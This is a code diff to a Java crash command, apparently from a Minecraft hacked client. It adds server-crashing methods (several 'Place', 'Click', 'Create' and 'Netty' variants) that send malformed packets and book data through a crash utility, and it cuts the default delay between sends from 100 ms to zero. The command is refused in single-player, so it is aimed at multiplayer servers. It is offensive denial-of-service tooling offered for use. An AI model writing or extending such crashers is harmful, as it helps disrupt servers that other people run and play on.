@@ -19,7 +19,8 @@ import java.util.Random;
 
 public class CrashCommand extends Command {
 
-    public static String[] crashType = new String[]{"MV", "Fawe", "Pex", "Position", "PayLoad", "Netty"};
+    public static String[] crashType = new String[]{"MV", "Fawe", "Pex", "Position", "PayLoad", "Netty",
+            "Place", "Click", "Create", "Cap", "Place2", "Place3", "Click2", "Click3", "NettyP", "NettyPL", "NettyC"};
     CrashUtils crashUtils = new CrashUtils();
 
     int bookType, bookvalue, redo, resolvebyte;
@@ -32,7 +33,7 @@ public class CrashCommand extends Command {
     @Override
     public void run(String alias, @NotNull String[] args) {
         if (args.length < 1) {
-            NotificationManager.show(new Notification(NotificationType.INFO, "Crasher", "Usage: ." + alias + " method_name/list <amount> delay(ms)", 1));
+            NotificationManager.show(new Notification(NotificationType.INFO, "Crasher", "Usage: ." + alias + " method_name/list <amount> delay(ms) (type [0 , 1]) (value [size]) (redo [type]) (byte [1]) (tags [0 true])", 5));
             return;
         }
 
@@ -49,7 +50,7 @@ public class CrashCommand extends Command {
             NotificationManager.show(new Notification(NotificationType.ERROR, "Crasher", "You are in Single Game!", 1));
         } else {
             try {
-                Main.INSTANCE.timing = args.length > 2 ? Long.parseLong(args[2]) : 100L;
+                Main.INSTANCE.timing = args.length > 2 ? Long.parseLong(args[2]) : 0L;
 
                 if (args.length > 5) {
                     bookType = Integer.parseInt(args[3]);
@@ -108,7 +109,28 @@ public class CrashCommand extends Command {
                         crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, false, CrashUtils.CrashType.CAP, amounts, setTag, resolvebyte);
                         break;
                     case "netty":
-                        crashUtils.crashdemo(crashUtils.netty, 0, 0, 12, true, CrashUtils.CrashType.CLICK, amounts, setTag, resolvebyte);
+                        crashUtils.crashdemo("\n", bookType, bookvalue, redo, false, CrashUtils.CrashType.CLICK, amounts, setTag, resolvebyte);
+                        break;
+                    case "nettyp":
+                        crashUtils.crashdemo("\n", bookType, bookvalue, redo, false, CrashUtils.CrashType.PLACE3, amounts, setTag, resolvebyte);
+                        break;
+                    case "nettypl":
+                        crashUtils.crashdemo("\n", bookType, bookvalue, redo, false, CrashUtils.CrashType.PAYLOAD1, amounts, setTag, resolvebyte);
+                        break;
+                    case "nettyc":
+                        crashUtils.crashdemo("\n", bookType, bookvalue, redo, false, CrashUtils.CrashType.CREATE, amounts, setTag, resolvebyte);
+                        break;
+                    case "place2":
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, false, CrashUtils.CrashType.PLACE2, amounts, setTag, resolvebyte);
+                        break;
+                    case "place3":
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, false, CrashUtils.CrashType.PLACE3, amounts, setTag, resolvebyte);
+                        break;
+                    case "click2":
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, false, CrashUtils.CrashType.CLICK2, amounts, setTag, resolvebyte);
+                        break;
+                    case "click3":
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, false, CrashUtils.CrashType.CLICK3, amounts, setTag, resolvebyte);
                         break;
                     case "action":
                         crashUtils.actioncrash(amounts);
@@ -129,7 +151,6 @@ public class CrashCommand extends Command {
 
     @Override
     public List<String> autoComplete(int arg, String[] args) {
-        String prefix = "";
         boolean flag = false;
 
         try {
